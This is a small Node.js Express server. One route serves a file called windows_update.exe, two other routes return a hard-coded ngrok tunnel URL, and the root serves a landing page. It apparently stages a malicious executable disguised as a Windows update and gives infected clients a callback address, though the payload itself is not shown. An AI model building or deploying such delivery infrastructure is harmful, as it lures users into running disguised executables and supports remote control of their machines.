const express = require('express');
const app = express();
const PORT = process.env.PORT || 4500;

app.all('/ok', (req, res) => {
    res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
})

app.all('/url', (req, res) => {
    res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
})

app.get('/download-file', function (req, res) {
    res.download(`${__dirname}/download/windows_update.exe`, function(err) {
        if(err) {
            console.log(err);
        }
    })
});

app.get('/', function (req, res) {
    res.sendFile(`${__dirname}/download/index.html`);
});

app.listen(PORT)
console.log(`Servidor listen on port ${PORT}`)